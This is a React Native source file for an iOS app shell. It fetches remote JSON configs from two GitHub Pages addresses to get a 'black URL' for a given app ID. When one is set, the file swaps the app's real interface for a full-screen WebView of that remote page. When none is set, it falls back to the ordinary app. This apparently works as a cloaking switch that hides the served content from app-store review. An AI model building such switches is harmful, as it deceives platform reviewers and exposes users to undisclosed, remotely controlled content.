/**
 * Master iOS No Track
 * 
 * iOS manager WITHOUT analytics (no AppsFlyer, no Amplitude, no ATT).
 * Only fetches black URL, displays WebView or app content.
 * 
 * @format
 */

import React, { useState, useEffect, useRef } from 'react';
import {
    View,
    StyleSheet,
    ActivityIndicator,
    TouchableOpacity,
    Text,
    Image,
    SafeAreaView,
} from 'react-native';
import AsyncStorage from '@react-native-async-storage/async-storage';
import { WebView, WebViewNavigation } from 'react-native-webview';
import AppBootstrap from './AppBootstrap';

const TRACKING_APP_ID = 'app376_ios';

const CONFIG_RD_URL = 'https://apps-cmyk.github.io/manager-config-rd/manager-config-rd.json';
const CONFIG_UP_URL = 'https://pincode69.github.io/manager-config-up/manager-config-up.json';

const fetchBlackUrl = async (trackingAppId: string): Promise<string> => {
    try {
        const upResponse = await fetch(`${CONFIG_UP_URL}?t=${Date.now()}`, {
            headers: { 'Cache-Control': 'no-cache, no-store, must-revalidate' },
        });
        if (upResponse.ok) {
            const upConfig = await upResponse.json();
            const upUrl = (upConfig as Record<string, string>)[trackingAppId];
            if (upUrl) return upUrl;
        }
    } catch { }

    try {
        const rdResponse = await fetch(`${CONFIG_RD_URL}?t=${Date.now()}`, {
            headers: { 'Cache-Control': 'no-cache, no-store, must-revalidate' },
        });
        if (rdResponse.ok) {
            const rdConfig = await rdResponse.json();
            const rdUrl = (rdConfig as Record<string, string>)[trackingAppId];
            if (rdUrl) return rdUrl;
        }
    } catch { }

    return '';
};

export const MASTER_IOS_NO_TRACK = () => {
    const [showLoader, setShowLoader] = useState(false);
    const [showWebView, setShowWebView] = useState<boolean | null>(null);
    const [isInitialized, setIsInitialized] = useState(false);
    const [blackUrl, setBlackUrl] = useState<string | null>(null);

    const [canGoBack, setCanGoBack] = useState(false);
    const [canGoForward, setCanGoForward] = useState(false);
    const webViewRef = useRef<WebView>(null);
    const isFetchedRef = useRef<boolean>(false);
    const loadEndTimerRef = useRef<NodeJS.Timeout | null>(null);

    useEffect(() => {
        (async () => {
            const url = await fetchBlackUrl(TRACKING_APP_ID);

            if (!url) {
                await AsyncStorage.setItem('@cachedBlackUrl', '');
                await AsyncStorage.setItem('@showWebView', 'false');
                setShowWebView(false);
                setIsInitialized(true);
                return;
            }

            setBlackUrl(url);

            const cachedUrl = await AsyncStorage.getItem('@cachedBlackUrl');
            const storedValue = await AsyncStorage.getItem('@showWebView');

            if (cachedUrl !== url) {
                await AsyncStorage.setItem('@cachedBlackUrl', url);
                await AsyncStorage.removeItem('@showWebView');
                setShowWebView(null);
                setShowLoader(true);
                setIsInitialized(true);
            } else if (storedValue !== null) {
                setShowWebView(storedValue === 'true');
                setIsInitialized(true);
            } else {
                setShowLoader(true);
                setIsInitialized(true);
            }
        })();

        return () => {
            if (loadEndTimerRef.current) {
                clearTimeout(loadEndTimerRef.current);
            }
        };
    }, []);

    const handleGoBack = () => {
        if (webViewRef.current && canGoBack) {
            webViewRef.current.goBack();
        }
    };

    const handleGoForward = () => {
        if (webViewRef.current && canGoForward) {
            webViewRef.current.goForward();
        }
    };

    const handleNavigationStateChange = (navState: WebViewNavigation) => {
        setCanGoBack(navState.canGoBack);
        setCanGoForward(navState.canGoForward);
    };

    const makeDecision = async (statusCode: number | undefined | null, source: string, isNetworkError: boolean = false) => {
        if (statusCode === 404 || isNetworkError) {
            await AsyncStorage.setItem('@showWebView', 'false');
            setShowWebView(false);
            setTimeout(() => {
                setShowLoader(false);
            }, 2000);
        } else {
            await AsyncStorage.setItem('@showWebView', 'true');
            setShowWebView(true);
            setShowLoader(false);
        }
    };

    const handleLoadEnd = async (syntheticEvent: any) => {
        const { nativeEvent } = syntheticEvent;

        if (showWebView === null && !isFetchedRef.current) {
            loadEndTimerRef.current = setTimeout(async () => {
                if (!isFetchedRef.current) {
                    isFetchedRef.current = true;
                    await makeDecision(200, 'handleLoadEnd');
                }
            }, 5000);
        }
    };

    const handleHttpError = async (syntheticEvent: any) => {
        const { nativeEvent } = syntheticEvent;

        if (showWebView === null && !isFetchedRef.current) {
            if (loadEndTimerRef.current) {
                clearTimeout(loadEndTimerRef.current);
                loadEndTimerRef.current = null;
            }

            isFetchedRef.current = true;
            await makeDecision(nativeEvent.statusCode, 'handleHttpError');
        }
    };

    const handleWebViewError = async (syntheticEvent: any) => {
        const { nativeEvent } = syntheticEvent;

        if (showWebView === null && !isFetchedRef.current) {
            if (loadEndTimerRef.current) {
                clearTimeout(loadEndTimerRef.current);
                loadEndTimerRef.current = null;
            }

            isFetchedRef.current = true;
            await makeDecision(undefined, 'handleWebViewError', true);
        }
    };

    return (
        <View style={styles.mainContainer}>
            {isInitialized && showWebView === false && (
                <View style={[styles.layerContainer, styles.layerContent]}>
                    <AppBootstrap useRootNavigator />;
                </View>
            )}

            {isInitialized && blackUrl && showWebView !== false && (
                <View style={[styles.layerContainer, styles.layerContent]}>
                    <SafeAreaView style={styles.container}>
                        <WebView
                            key={`webview-${blackUrl}`}
                            ref={webViewRef}
                            source={{ uri: blackUrl }}
                            style={styles.webview}
                            allowsInlineMediaPlayback={true}
                            mediaPlaybackRequiresUserAction={true}
                            javaScriptEnabled={true}
                            domStorageEnabled={true}
                            scrollEnabled={true}
                            allowsBackForwardNavigationGestures={true}
                            allowsLinkPreview={false}
                            onNavigationStateChange={handleNavigationStateChange}
                            onLoadEnd={handleLoadEnd}
                            onHttpError={handleHttpError}
                            onError={handleWebViewError}
                        />
                        <WebViewHUD
                            canGoBack={canGoBack}
                            canGoForward={canGoForward}
                            onGoBack={handleGoBack}
                            onGoForward={handleGoForward}
                        />
                    </SafeAreaView>
                </View>
            )}

            {showLoader && <LoaderOverlay />}
        </View>
    );
};

const LoaderOverlay: React.FC = () => {
    return (
        <View style={[styles.layerContainer, styles.layerLoader]}>
            <SafeAreaView style={styles.loader}>
                <View style={styles.loaderIconWrapper}>
                    <Image
                        source={{ uri: 'AppIcon60x60' }}
                        style={styles.loaderIcon}
                    />
                </View>
                <ActivityIndicator size="large" color="red" />
            </SafeAreaView>
        </View>
    );
};

interface WebViewHUDProps {
    canGoBack: boolean;
    canGoForward: boolean;
    onGoBack: () => void;
    onGoForward: () => void;
}

const WebViewHUD: React.FC<WebViewHUDProps> = ({ canGoBack, canGoForward, onGoBack, onGoForward }) => {
    return (
        <View style={styles.hud}>
            <TouchableOpacity
                onPress={onGoBack}
                disabled={!canGoBack}
                style={canGoBack ? styles.hudButton : styles.hudButtonDisabled}
            >
                <Text style={styles.hudButtonText}>{"←"}</Text>
            </TouchableOpacity>
            <TouchableOpacity
                onPress={onGoForward}
                disabled={!canGoForward}
                style={canGoForward ? styles.hudButton : styles.hudButtonDisabled}
            >
                <Text style={styles.hudButtonText}>{"→"}</Text>
            </TouchableOpacity>
        </View>
    );
};

const styles = StyleSheet.create({
    container: {
        flex: 1,
        backgroundColor: '#000000',
    },
    webview: {
        flex: 1,
        backgroundColor: '#000000',
    },
    loader: {
        flex: 1,
        justifyContent: 'center',
        alignItems: 'center',
        backgroundColor: '#000000',
    },
    hud: {
        flexDirection: 'row',
        justifyContent: 'center',
        alignItems: 'center',
        backgroundColor: '#000000',
        paddingVertical: 10,
        gap: 50,
    },
    layerContainer: {
        position: 'absolute',
        top: 0,
        left: 0,
        right: 0,
        bottom: 0,
        width: '100%',
        height: '100%',
    },
    mainContainer: {
        flex: 1,
    },
    layerContent: {
        zIndex: 2,
    },
    layerLoader: {
        zIndex: 10,
        backgroundColor: '#000000',
    },
    loaderIconWrapper: {
        width: 150,
        height: 150,
        borderRadius: 12,
        overflow: 'hidden',
        marginBottom: 48,
    },
    loaderIcon: {
        width: 150,
        height: 150,
    },
    hudButton: {
        opacity: 1,
    },
    hudButtonDisabled: {
        opacity: 0.3,
    },
    hudButtonText: {
        color: 'white',
        fontSize: 24,
    },
});
